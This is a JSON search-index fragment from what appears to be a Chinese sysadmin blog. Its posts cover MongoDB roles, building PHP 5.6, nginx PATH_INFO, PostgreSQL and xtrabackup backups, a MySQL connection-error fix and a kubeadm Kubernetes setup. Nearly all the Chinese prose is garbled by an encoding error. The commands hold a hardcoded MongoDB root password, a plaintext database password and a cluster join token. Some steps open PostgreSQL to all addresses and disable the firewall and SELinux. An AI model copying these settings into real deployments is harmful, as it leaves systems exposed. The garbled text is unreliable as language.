clusterAdminï¼šåªåœ¨adminæ•°æ®åº“ä¸­å¯ç”¨ï¼Œèµ‹äºˆç”¨æˆ·æ‰€æœ‰åˆ†ç‰‡å’Œå¤åˆ¶é›†ç›¸å…³å‡½æ•°çš„ç®¡ç†æƒé™ã€‚ readAnyDatabaseï¼šåªåœ¨adminæ•°æ®åº“ä¸­å¯ç”¨ï¼Œèµ‹äºˆç”¨æˆ·æ‰€æœ‰æ•°æ®åº“çš„è¯»æƒé™ readWriteAnyDatabaseï¼šåªåœ¨adminæ•°æ®åº“ä¸­å¯ç”¨ï¼Œèµ‹äºˆç”¨æˆ·æ‰€æœ‰æ•°æ®åº“çš„è¯»å†™æƒé™ userAdminAnyDatabaseï¼šåªåœ¨adminæ•°æ®åº“ä¸­å¯ç”¨ï¼Œèµ‹äºˆç”¨æˆ·æ‰€æœ‰æ•°æ®åº“çš„userAdminæƒé™ dbAdminAnyDatabaseï¼šåªåœ¨adminæ•°æ®åº“ä¸­å¯ç”¨ï¼Œèµ‹äºˆç”¨æˆ·æ‰€æœ‰æ•°æ®åº“çš„dbAdminæƒé™ã€‚ rootï¼šåªåœ¨adminæ•°æ®åº“ä¸­å¯ç”¨ã€‚è¶…çº§è´¦å·ï¼Œè¶…çº§æƒé™ 3.æ·»åŠ ç®¡ç†å‘˜è´¦å·åŠå®Œæˆè®¤è¯ db.createUser({user:â€™rootâ€™,pwd:â€™zuchezaixianâ€™,roles:[{role:â€™rootâ€™,db:â€™adminâ€™}]}) æ³¨ï¼šæ‰€æœ‰æ•°æ®åº“ä¸‹çš„ç”¨æˆ·éƒ½åœ¨adminçš„usersé›†åˆä¸­å¯ä»¥æŸ¥è¯¢åˆ°ï¼šdb.system.users.find() ","date":"2019-12-16 16:26","objectID":"/post/1221/:0:0","tags":["æ•°æ®åº“"],"title":"mongodbæƒé™","uri":"/post/1221/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":" wgetÂ https://www.php.net/distributions/php-5.6.40.tar.gz tar xf php-5.6.40.tar.gz cd php-5.6.40/ yum install -y openssl-devel libxml2 libxml2-devel bzip2 bzip2-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel mcrypt libmcrypt libmcrypt-devel ./configure --prefix=/application/php5.6.40 --enable-fpm --enable-mysqlnd --with-mysql=/application/mysql --with-pdo-mysql=/application/mysql --with-mysqli=/application/mysql/bin/mysql_config --with-libxml-dir --with-gd --with-jpeg-dir --with-png-dir --with-freetype-dir --with-iconv-dir --with-zlib-dir --with-bz2 --with-openssl --with-mcrypt --enable-soap --enable-mbstring --enable-sockets --enable-exif --with-config-file-path=/application/php5.6.40/etc/ make \u0026\u0026 make install ln -s /application/php5.6.40/ /application/php cp php.ini-production /application/php5.6.40/etc/php.ini cp sapi/fpm/php-fpm.service /etc/systemd/system/php-fpm.service sed -i 's#${prefix}#/application/php#' /etc/systemd/system/php-fpm.service sed -i 's#${exec_prefix}#/application/php#' /etc/systemd/system/php-fpm.service mv /application/php5.6.40/etc/php-fpm.conf{.default,} #ä¿®æ”¹php-fpmç”¨æˆ· vim /application/php5.6.40/etc/php-fpm.conf systemctl start php-fpm ","date":"2019-12-16 16:24","objectID":"/post/1219/:0:0","tags":["php"],"title":"php5.6.40ç¼–è¯‘å®‰è£…","uri":"/post/1219/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‚è€ƒåœ°å€ï¼šhttps://www.cnblogs.com/hfdp/p/5867844.html è¯·æ±‚çš„ç½‘å€æ˜¯http://xxx.com/index.php/admin/bbb/ccc/index PATH_INFOçš„å€¼æ˜¯/admin/bbb/ccc/index SCRIPT_FILENAMEçš„å€¼æ˜¯$doucment_root/index.php SCRIPT_NAME /index.php æ‰€ä»¥php(.*)$ä¸­$1çš„å€¼å°±æ˜¯PATH_INFO é…ç½®pathinfo # æ­£åˆ™åŒ¹é….phpåçš„pathinfoéƒ¨åˆ† location ~ \\.php(.*)$ { root /xxx; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $DOCUMENT_ROOT$fastcgi_script_name; # æŠŠpathinfoéƒ¨åˆ†èµ‹ç»™PATH_INFOå˜é‡ fastcgi_param PATH_INFO $1; include fastcgi_params; } ","date":"2019-12-10 18:43","objectID":"/post/1194/:0:0","tags":["nginx"],"title":"nginxé…ç½®pathinfoï¼Œè§£å†³thinkphp404é—®é¢˜","uri":"/post/1194/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å¤‡ä»½ ","date":"2019-11-21 15:27","objectID":"/post/1151/:1:0","tags":["postgresql","pgsql"],"title":"pgsqlå¤‡ä»½æ¢å¤","uri":"/post/1151/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"pg_dumpï¼š é€šç”¨é€‰é¡¹ï¼š -f, --file=FILENAME è¾“å‡ºçš„æ–‡ä»¶è·¯å¾„ -F, --format=c|d|t|p è¾“å‡ºçš„æ ¼å¼(custom, directory, tar, plain text(é»˜è®¤)) -j, --jobs=NUM ä½¿ç”¨æŒ‡å®šä»»åŠ¡æ•°é‡æ¥å¹¶è¡Œå¤‡ä»½ -v, --verbose æ˜¾ç¤ºå¤‡ä»½è¯¦ç»†ä¿¡æ¯ -V, --version æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ -Z, --compress=0-9 å‹ç¼©çº§åˆ« --lock-wait-timeout=TIMEOUT ç­‰å¾…è¡¨çº§é”è¶…æ—¶æ—¶é—´ è¿æ¥é€‰é¡¹ï¼š -d, --dbname=DBNAME å¤‡ä»½çš„æ•°æ®åº“åç§° -h, --host=HOSTNAME æ•°æ®åº“åœ°å€æˆ–socketè·¯å¾„ -p, --port=PORT æ•°æ®åº“ç«¯å£ -U, --username=NAME è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å -w, --no-password ç¦æ­¢æç¤ºè¾“å…¥å¯†ç  -W, --password å¼ºåˆ¶æç¤ºå¯†ç è¾“å…¥ --role=ROLENAME å¤‡ä»½å‰è®¾ç½®è§’è‰² å¤‡ä»½å‚æ•°ï¼š -a, --data-only åªå¤‡ä»½æ•°æ®ï¼Œä¸å¤‡ä»½schema -C, --create å¤‡ä»½ä¸­åŒ…å«åˆ›å»ºæ•°æ®åº“çš„å‘½ä»¤ -E, --encoding=ENCODING ä»¥æŒ‡å®šçš„ç¼–ç æ–¹å¼å¤‡ä»½æ•°æ® -n, --schema=SCHEMA åªå¤‡ä»½æŒ‡å®šçš„schema(s) -N, --exclude-schema=SCHEMA ä¸å¤‡ä»½æŒ‡å®šschema(s) -O, --no-owner å½“æ ¼å¼ä¸ºplainæ—¶ï¼Œå¿½ç•¥æ¢å¤å¯¹è±¡æ‰€æœ‰è€… -s, --schema-only åªå¤‡ä»½schemaï¼Œä¸å¤‡ä»½æ•°æ® -t, --table=TABLE åªå¤‡ä»½æŒ‡å®šçš„è¡¨ -T, --exclude-table=TABLE ä¸å¤‡ä»½æŒ‡å®šçš„è¡¨ -x, --no-privileges ä¸å¤‡ä»½æƒé™(grant/revoke) --column-inserts ä½¿ç”¨insertçš„æ–¹å¼å¤‡ä»½ï¼Œinsertè¯­å¥ä¸­åŒ…å«å­—æ®µåç§° --disable-triggers åœ¨ä»…è¿˜åŸæ•°æ®æ—¶ç¦ç”¨è§¦å‘å™¨ --exclude-table-data=TABLE ä¸å¤‡ä»½æŒ‡å®šè¡¨çš„æ•°æ® --if-exists use IF EXISTS when dropping objects --inserts ä½¿ç”¨insertçš„æ–¹å¼å¤‡ä»½ï¼Œinsertè¯­å¥ä¸­ä¸åŒ…å«å­—æ®µåç§° --no-tablespaces ä¸å¤‡ä»½è¡¨ç©ºé—´åˆ†é…ä¿¡æ¯ ç®€å•å¤‡ä»½ pg_dump -Upostgres -h 10.0.0.2 -d test -f test.sql ","date":"2019-11-21 15:27","objectID":"/post/1151/:1:1","tags":["postgresql","pgsql"],"title":"pgsqlå¤‡ä»½æ¢å¤","uri":"/post/1151/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"psqlæ™®é€šæ–‡æœ¬æ ¼å¼æ¢å¤ é€šç”¨å‚æ•°ï¼š -d, --dbname=DBNAME æŒ‡å®šæ•°æ®åº“ -f, --file=FILENAME æŒ‡å®šè¦æ‰§è¡Œçš„sqlæ–‡ä»¶ -X, --no-psqlrc ä¸è¯»å–å¯åŠ¨æ–‡ä»¶(~/.psqlrc) æ¢å¤ psql -Upostgres -h 10.0.0.2 -d test -f test.sql ","date":"2019-11-21 15:27","objectID":"/post/1151/:2:0","tags":["postgresql","pgsql"],"title":"pgsqlå¤‡ä»½æ¢å¤","uri":"/post/1151/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"pg_restoreæ¢å¤ é€šç”¨å‚æ•°ï¼š -d, --dbname=NAME æ•°æ®åº“ -F, --format=c|d|t å¤‡ä»½æ–‡ä»¶çš„æ ¼å¼(custom, directory, tar)ï¼Œå¯ä»¥è‡ªåŠ¨è¯†åˆ« -v, --verbose æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ æ¢å¤å‚æ•°ï¼š -a, --data-only åªè¿˜åŸæ•°æ®, ä¸è¿˜åŸschema -c, --clean åœ¨é‡æ–°åˆ›å»ºä¹‹å‰åˆ é™¤æ•°æ®åº“å¯¹è±¡ -C, --create åˆ›å»ºç›®æ ‡æ•°æ®åº“ -e, --exit-on-error å‡ºé”™æ—¶é€€å‡º, é»˜è®¤ç»§ç»­ -I, --index=NAME è¿˜åŸç´¢å¼•å -j, --jobs=NUM ä½¿ç”¨æŒ‡å®šä»»åŠ¡æ•°é‡æ¥å¹¶è¡Œæ¢å¤ -n, --schema=NAME åªæ¢å¤æŒ‡å®šçš„schema -O, --no-owner è·³è¿‡å¯¹è±¡æ‰€æœ‰æƒçš„æ¢å¤ -P, --function=NAME(args) æ¢å¤æŒ‡å®šåå­—çš„å‡½æ•° -s, --schema-only åªæ¢å¤schemaï¼Œä¸æ¢å¤æ•°æ® -S, --superuser=NAME ç”¨äºç¦ç”¨è§¦å‘å™¨çš„è¶…çº§ç”¨æˆ·ç”¨æˆ·å -t, --table=NAME æ¢å¤æŒ‡å®šè¡¨å -T, --trigger=NAME æ¢å¤æŒ‡å®šè§¦å‘å™¨ -x, --no-privileges è·³è¿‡è®¿é—®æƒé™çš„æ¢å¤(grant/revoke) -1, --single-transaction ä½œä¸º1ä¸ªäº‹åŠ¡æ¢å¤ --disable-triggers åœ¨åªæ¢å¤æ•°æ®æœŸé—´ç¦ç”¨è§¦å‘å™¨ --if-exists åˆ é™¤å¯¹è±¡æ—¶ä½¿ç”¨IF EXISTS --no-tablespaces ä¸æ¢å¤è¡¨ç©ºé—´åˆ†é…ä¿¡æ¯ è¿æ¥å‚æ•°ï¼ŒåŒpg_dump æ³¨æ„:pg_restore xxx.tarä»£è¡¨è¯»å–å‹ç¼©å¤‡ä»½çš„å†…å®¹ å¤‡ä»½æ¢å¤ä¾‹å­ï¼š #å¤‡ä»½teståº“ pg_dump -d test -F t -f test.tar #æ¢å¤teståº“ pg_restore -d test test.tar æ¢å¤æŒ‡å®šè¡¨ï¼š # é€ æ•°æ® create database test; \\c test create table t1(id int, context varchar(32)); insert into t1(id,context) values(1,'ä½ å¥½'); insert into t1 values(2,'soulchild'); create table t2(id int, comment varchar(128)); insert into t2 values(1,'test1') insert into t2 values(2,'test2') #å¤‡ä»½ pg_dump -F t -d test -f test.tar #åˆ é™¤è¡¨ drop table t1; #æ¢å¤t1è¡¨ pg_restore -d test -t t1 ./test.tar ","date":"2019-11-21 15:27","objectID":"/post/1151/:3:0","tags":["postgresql","pgsql"],"title":"pgsqlå¤‡ä»½æ¢å¤","uri":"/post/1151/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å®‰è£…yumæºï¼š rpm -ivh https://download.postgresql.org/pub/repos/yum/9.4/redhat/rhel-7.6-x86_64/pgdg-centos94-9.4-3.noarch.rpm å®‰è£…pgsqlï¼š yum install -y postgresql94-server postgresql94-contrib åˆå§‹åŒ–æ•°æ®åº“ï¼š # /usr/pgsql-9.4/bin/postgresql94-setup initdb åˆ›å»ºpostgreså¯†ç  su â€“ postgres psql -U postgres ALTER USER postgres with encrypted password 'å¯†ç ' é…ç½®è¿œç¨‹è®¿é—® vim /var/lib/pgsql/9.4/data/postgresql.conf listen_addressÂ =Â \"*\" vim /var/lib/pgsql/9.4/data/pg_hba.conf IPv4 local connectionsä¸‹æ–¹æ·»åŠ å…è®¸è¿æ¥çš„IP host all all 0.0.0.0/0 md5 é‡å¯æœåŠ¡ systemctl restartÂ postgresql-9.4.service ","date":"2019-11-21 15:07","objectID":"/post/1149/:0:0","tags":["postgresql","pgsql"],"title":"centos7ä½¿ç”¨yumå®‰è£…postgresql9.4","uri":"/post/1149/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å‚è€ƒé“¾æ¥ï¼šhttp://blog.itpub.net/21374452/viewspace-2155266/ è§£å†³æ–¹æ³•ï¼š 1ã€æé«˜å…è®¸çš„max_connection_errorsæ•°é‡ï¼š è¿›å…¥Mysqlæ•°æ®åº“æŸ¥çœ‹max_connection_errorsï¼š show variables like '%max_connect_errors%';Â ä¿®æ”¹max_connection_errorsçš„æ•°é‡ä¸º1000ï¼š set global max_connect_errors = 1000;Â æŸ¥çœ‹æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼š show variables like '%max_connect_errors%';Â 2ã€åˆ·æ–°hosts mysqladmin -uxxx -pxxx flush-hosts ä¹Ÿå¯ä»¥ä½¿ç”¨socketæ–¹å¼ï¼š mysqladmin -uxxx -pxxx --socket=/tmp/mysql.sockÂ flush-hosts é»˜è®¤æƒ…å†µä¸‹ï¼Œmy.cnfæ–‡ä»¶ä¸­å¯èƒ½æ²¡æœ‰æ­¤è¡Œï¼Œå¦‚æœéœ€è¦è®¾ç½®æ­¤æ•°å€¼ï¼Œæ‰‹åŠ¨æ·»åŠ å³å¯ã€‚ vi /etc/my.cnf max_connect_errors = 1000 é…ç½®è¯´æ˜ï¼š å½“æ­¤å€¼è®¾ç½®ä¸º10æ—¶ï¼Œæ„å‘³ç€å¦‚æœæŸä¸€å®¢æˆ·ç«¯å°è¯•è¿æ¥æ­¤MySQLæœåŠ¡å™¨ï¼Œä½†æ˜¯å¤±è´¥ï¼ˆå¦‚å¯†ç é”™è¯¯ç­‰ç­‰ï¼‰10æ¬¡ï¼Œåˆ™MySQLä¼šæ— æ¡ä»¶å¼ºåˆ¶é˜»æ­¢æ­¤å®¢æˆ·ç«¯è¿æ¥ã€‚ å¦‚æœå¸Œæœ›é‡ç½®æ­¤è®¡æ•°å™¨çš„å€¼ï¼Œåˆ™å¿…é¡»é‡å¯MySQLæœåŠ¡å™¨æˆ–è€…æ‰§è¡Œ mysql\u003e flush hosts; å‘½ä»¤ã€‚ å½“è¿™ä¸€å®¢æˆ·ç«¯æˆåŠŸè¿æ¥ä¸€æ¬¡MySQLæœåŠ¡å™¨åï¼Œé’ˆå¯¹æ­¤å®¢æˆ·ç«¯çš„max_connect_errorsä¼šæ¸…é›¶ã€‚ ","date":"2019-11-21 09:34","objectID":"/post/1144/:0:0","tags":["mysql"],"title":"mysql ERROR 1129 (HY000): Host 'xxxx' is blocked because of many connect","uri":"/post/1144/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"ctrl + z æŠŠå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤æ”¾åˆ°åå°ï¼Œå¹¶ä¸”æš‚åœ jobs æŸ¥çœ‹åå°è¿è¡Œçš„å‘½ä»¤ bg å°†ä¸€ä¸ªåœ¨åå°æš‚åœçš„å‘½ä»¤ï¼Œå˜æˆç»§ç»­æ‰§è¡Œï¼Œé€šè¿‡jobå‘½ä»¤æŸ¥è¯¢ç¼–å·ï¼Œä¾‹å¦‚ï¼šbg 1 fg å°†åå°ä¸­çš„å‘½ä»¤è°ƒå›å‰å°ç»§ç»­è¿è¡Œï¼Œé€šè¿‡jobå‘½ä»¤æŸ¥è¯¢ç¼–å·ï¼Œä¾‹å¦‚ï¼šfg 1 ","date":"2019-11-16 23:45","objectID":"/post/1128/:0:0","tags":[],"title":"åå°æ‰§è¡Œå‘½ä»¤ï¼Œctrl + zã€jobsã€bgã€fg","uri":"/post/1128/"},{"categories":["databases"],"content":"tmpç›®å½•æ²¡æœ‰æƒé™å¯¼è‡´ ä½¿ç”¨mongodbå‚æ•°â€“nounixsocket mongod --config /etc/mongod.conf --nounixsocket --fork æˆ–è€…ä¿®æ”¹tmpç›®å½•æƒé™ å¦‚æœæ— æ³•ä¿®æ”¹ï¼Œå¯ä»¥å°è¯•chattr -i /tmp ","date":"2019-11-16 23:23","objectID":"/post/1125/:0:0","tags":["æ•°æ®åº“"],"title":"mongodb Failed to set up listener: SocketException: Permission denied","uri":"/post/1125/"},{"categories":["kubernetes"],"content":"ç”±äºä»“åº“éœ€è¦è®¤è¯çš„åŸå› ï¼Œæ‰€ä»¥éœ€è¦k8sç”Ÿæˆsecretï¼š #åˆ›å»ºsecret kubectl create secret docker-registry secretåç§° --docker-server=ä»“åº“åœ°å€ --docker-username=ç”¨æˆ·å --docker-password=å¯†ç  #é€šè¿‡è·å–dataä¸‹çš„dockerconfigjsonå€¼åšå‡ºåè§£ï¼Œå¯ä»¥è·å–åŸå§‹ä¿¡æ¯ kubectl get -n shjj secrets my-secret --output=\"jsonpath={.data.\\.dockerconfigjson}\" | base64 -d åº”ç”¨åˆ°deploymentèµ„æºyamlæ–‡ä»¶ä¸­ï¼š --- apiVersion: apps/v1 kind: Deployment metadata: name: app namespace: default spec: replicas: 2 selector: matchLabels: app: app template: metadata: labels: app: app spec: imagePullSecrets: - name: registry-secret containers: - name: app image: {image_name} ports: - containerPort: 9998 ","date":"2019-11-15 14:05","objectID":"/post/1121/:0:0","tags":["k8s"],"title":"dockerå¯ä»¥pullé•œåƒï¼Œä½†æ˜¯k8sä¸èƒ½pullï¼Œé…ç½®ç§æœ‰ä»“åº“secret","uri":"/post/1121/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"dockerfileä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹å³å¯ï¼š RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \\ \u0026\u0026 apk update \u0026\u0026 apk add tzdata \u0026\u0026 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026\u0026 echo \"Asia/Shanghai\" \u003e /etc/timezone \\ \u0026\u0026 apk del tzdata or FROM registry.cn-shanghai.aliyuncs.com/soulchild/oracle-jdk:8u212-debian RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ENV TZ 'Asia/Shanghai' ADD ./target/xxx.jar / ","date":"2019-11-15 10:20","objectID":"/post/1118/:0:0","tags":["docker"],"title":"alpineé•œåƒä¿®æ”¹æ—¶åŒºæ—¶é—´","uri":"/post/1118/"},{"categories":["kubernetes"],"content":"æœ¬æ–‡å‚è€ƒï¼šhttps://www.kubernetes.org.cn/5462.html 1-6æ­¥åœ¨ä¸‰å°ä¸»æœºä¸Šéƒ½åšé…ç½® 1.ä¸‰å°ä¸»æœºé…ç½®ä¸»æœºå ä¸»æœºå ip test-k8s-master 10.0.0.10 test-k8s-node1 10.0.0.11 test-k8s-node2 10.0.0.12 Â  2.è®¾ç½®hostsè§£æ cat \u003c\u003cEOF \u003e\u003e/etc/hosts 10.0.0.10 test-k8s-master 10.0.0.11 test-k8s-node1 10.0.0.12 test-k8s-node2 EOF 3.å…³é—­é˜²ç«å¢™ã€selinuxå’Œswapã€‚ systemctl stop firewalld systemctl disable firewalld setenforce 0 sed -i \"s/^SELINUX=enforcing/SELINUX=disabled/g\" /etc/selinux/config swapoff -a sed -i 's/.*swap.*/#\u0026/' /etc/fstab 4.é…ç½®å†…æ ¸å‚æ•°ï¼Œå°†æ¡¥æ¥çš„IPv4æµé‡ä¼ é€’åˆ°iptablesçš„é“¾ cat \u003e /etc/sysctl.d/k8s.conf \u003c\u003cEOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 EOF sysctl --system 5.é…ç½®k8sæºå’Œdockeræº #k8sæº cat \u003c\u003cEOF \u003e /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/ enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF #dockeræº wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo 6.å®‰è£…è½¯ä»¶ 6.1.å®‰è£…docker yum install -y docker-ce-18.06.1.ce-3.el7 systemctl enable docker \u0026\u0026 systemctl start docker docker â€“v Docker version 18.06.1-ce, build e68fc7a 6.2ä¿®æ”¹æ–‡ä»¶é©±åŠ¨ä¸ºsystemdï¼Œå’Œkubeletä¸€è‡´,ä¿®æ”¹dockerå­˜å‚¨è·¯å¾„ vim /etc/docker/daemon.json { \"exec-opts\": [\"native.cgroupdriver=systemd\"] , \"graph\": \"/data/docker\" } systemctl restart docker 6.3.å®‰è£…kubeadmã€kubeletã€kubectl yum install -y kubelet-1.14.2-0 kubectl-1.14.2-0 kubeadm-1.14.2-0 systemctl enable kubelet kubeadmï¼šå¿«é€Ÿå®‰è£…k8sçš„å·¥å…· kubeletï¼šmasteré€šè¿‡kubeletä¸nodeé€šä¿¡ï¼Œå¹¶è¿›è¡Œæœ¬èŠ‚ç‚¹Podå’Œå®¹å™¨ç”Ÿå‘½å‘¨æœŸçš„ç®¡ç† kubectlï¼šk8sé›†ç¾¤ç®¡ç†å·¥å…· 7.éƒ¨ç½²masterèŠ‚ç‚¹ åœ¨masterè¿›è¡ŒKubernetesé›†ç¾¤åˆå§‹åŒ–ã€‚ kubeadm init --kubernetes-version=1.14.2 \\ --apiserver-advertise-address=10.0.0.10 \\ --image-repository registry.aliyuncs.com/google_containers \\ --service-cidr=10.1.0.0/16 \\ --pod-network-cidr=10.244.0.0/16 å®šä¹‰PODçš„ç½‘æ®µä¸º: 10.244.0.0/16ï¼Œ api serveråœ°å€å°±æ˜¯masteræœ¬æœºIPåœ°å€ã€‚ è¿™ä¸€æ­¥å¾ˆå…³é”®ï¼Œç”±äºkubeadm é»˜è®¤ä»å®˜ç½‘k8s.grc.ioä¸‹è½½æ‰€éœ€é•œåƒï¼Œå›½å†…æ— æ³•è®¿é—®ï¼Œå› æ­¤éœ€è¦é€šè¿‡â€“image-repositoryæŒ‡å®šé˜¿é‡Œäº‘é•œåƒä»“åº“åœ°å€ é›†ç¾¤åˆå§‹åŒ–æˆåŠŸåè¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼ˆéœ€è¦è®°å½•ä¸‹æ¥ï¼‰ï¼š Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 10.0.0.10:6443 --token da24z4.dg7gxgrer1ywvoyv \\ --discovery-token-ca-cert-hash sha256:748cdf603bce6057848493c2fcf8898b9ca37c16ac83129e5d7c47ad8d868528 æŒ‰ç…§æç¤ºæ‰§è¡Œï¼š mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config é…ç½®flannelç½‘ç»œï¼š kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/a70459be0084506e4ec919aa1c114638878db11b/Documentation/kube-flannel.yml 8.éƒ¨ç½²nodeèŠ‚ç‚¹ æ‰§è¡Œä¸Šé¢è®°å½•çš„å‘½ä»¤ï¼Œä½¿æ‰€æœ‰nodeèŠ‚ç‚¹åŠ å…¥Kubernetesé›†ç¾¤ kubeadm join 10.0.0.10:6443 --token da24z4.dg7gxgrer1ywvoyv \\ --discovery-token-ca-cert-hash sha256:748cdf603bce6057848493c2fcf8898b9ca37c16ac83129e5d7c47ad8d868528 éƒ¨ç½²å®ŒnodeèŠ‚ç‚¹åéªŒè¯ï¼š [root@test-k8s-master ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION test-k8s-master Ready master 61m v1.14.2 test-k8s-node1 Ready \u003cnone\u003e 16m v1.14.2 test-k8s-node2 NotReady \u003cnone\u003e 16m v1.14.2 node2å¤„äºå¼‚å¸¸çŠ¶æ€ æ’æŸ¥ï¼š kubectl get all -o wide -n kube-system å‘ç°node2èŠ‚ç‚¹çš„flannelé•œåƒä¸‹è½½å¤±è´¥ pod/kube-flannel-ds-amd64-zhdcj 0/1 Init:ImagePullBackOff æŸ¥çœ‹podè¯¦ç»†ä¿¡æ¯ï¼š kubectl describe pod kube-flannel-ds-amd64-zhdcj -n kube-system å°è¯•æ‰‹åŠ¨pullé•œåƒ,ä¸è¡Œå°±åœ¨docker hubä¸Šæ‰¾ä¸€ä¸ªäº† åœ¨node2èŠ‚ç‚¹æ‰§è¡Œ docker pull quay.io/coreos/flannel:v0.11.0-amd64 pullä¸‹æ¥ç­‰ä¸€å°ä¼šnode2å°±æ­£å¸¸äº† 9.éƒ¨ç½²dashboard 1.ä¸‹è½½yamlæ–‡ä»¶ wget https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æˆ–ç›´æ¥æ‰‹åŠ¨ç¼–è¾‘kubernetes-dashboard.yamlæ–‡ä»¶ï¼Œ","date":"2019-11-10 16:04","objectID":"/post/1100/:0:0","tags":["k8s"],"title":"kubeadméƒ¨ç½²kubernetes 1.14å•ä¸»é›†ç¾¤","uri":"/post/1100/"},{"categories":["å…¶ä»–"],"content":"source \u003c(å‘½ä»¤ completion bash) ä¸¾ä¾‹ï¼š source \u003c(kubectl completion bash) ","date":"2019-11-10 16:04","objectID":"/post/1109/:0:0","tags":[],"title":"tableå‘½ä»¤è¡¥é½å¤±æ•ˆ","uri":"/post/1109/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å¢é‡å¤‡ä»½ä»…é’ˆå¯¹äºinnodbå¼•æ“ï¼Œå¯¹äºmyisamå¼•æ“ä¾ç„¶æ˜¯å…¨å¤‡ã€‚ å‚æ•°è¯´æ˜ï¼š â€“userï¼šæ•°æ®åº“ç”¨æˆ·å â€“passwordï¼šæ•°æ®åº“å¯†ç  â€“socketï¼šè¿æ¥æœ¬åœ°æ•°æ®åº“æ—¶ä½¿ç”¨çš„å¥—æ¥å­—æ–‡ä»¶è·¯å¾„ â€“incrementalï¼šæŒ‡å®šå¢é‡å¤‡ä»½è·¯å¾„ â€“incremental-basedirï¼šæŒ‡å®šåŸºäºå“ªä¸ªå¤‡ä»½åšå¢é‡å¤‡ä»½ â€“parallel=2ï¼šæŒ‡å®šçº¿ç¨‹æ•°é‡ â€“apply-logï¼šæŒ‡å®šxtrabackup_logfileæ–‡ä»¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹,åœ¨å¤‡ä»½å®Œæˆåï¼Œæ•°æ®å°šä¸”ä¸èƒ½ç”¨äºæ¢å¤æ“ä½œï¼Œå› ä¸ºå¤‡ä»½çš„æ•°æ®ä¸­å¯èƒ½ä¼šåŒ…å«å°šæœªæäº¤çš„äº‹åŠ¡æˆ–å·²ç»æäº¤ä½†å°šæœªåŒæ­¥è‡³æ•°æ®æ–‡ä»¶ä¸­çš„äº‹åŠ¡ã€‚å› æ­¤ï¼Œæ­¤æ—¶æ•°æ® æ–‡ä»¶ä»å¤„ç†ä¸ä¸€è‡´çŠ¶æ€ã€‚â€“apply-logçš„ä½œç”¨æ˜¯é€šè¿‡å›æ»šæœªæäº¤çš„äº‹åŠ¡åŠåŒæ­¥å·²ç»æäº¤çš„äº‹åŠ¡è‡³æ•°æ®æ–‡ä»¶ä½¿æ•°æ®æ–‡ä»¶å¤„äºä¸€è‡´æ€§çŠ¶æ€ã€‚ â€“redo-onlyï¼šåªé‡åšå·²æäº¤çš„äº‹åŠ¡ï¼Œä¸å›æ»šæœªæäº¤çš„äº‹åŠ¡ â€“incremental-dirï¼šæŒ‡å®šå¢é‡å¤‡ä»½çš„ç›®å½• å¢é‡å¤‡ä»½ä¸‰ä¸ªæ­¥éª¤ï¼š Â  1.å…¨å¤‡ï¼ˆå¤‡ä»½è‡³Â /data/backup/full/ç›®å½•ï¼‰ innobackupex â€“defaults-file=/etc/my.cnf â€“user=root â€“password=123456 â€“socket=/tmp/mysql.sockÂ /data/backup/full/ 2.ç¬¬ä¸€æ¬¡å¢é‡å¤‡ä»½ï¼ˆåŸºäºå…¨å¤‡ï¼‰ innobackupex â€“defaults-file=/etc/my.cnf â€“user=root â€“password=123456 â€“scoket=/tmp/mysql.sock â€“incremental /data/backup/incremental â€“incremental-basedir=/data/backup/full/2019-11-06_15-04-50 â€“parallel=2 3.ç¬¬äºŒæ¬¡å¢é‡å¤‡ä»½ï¼ˆåŸºäºä¸Šä¸€æ¬¡çš„å¢é‡å¤‡ä»½ï¼‰ innobackupex â€“defaults-file=/etc/my.cnf â€“user=root â€“password=123456 â€“socket=/tmp/mysql.sock â€“incremental /data/backup/incremental/ 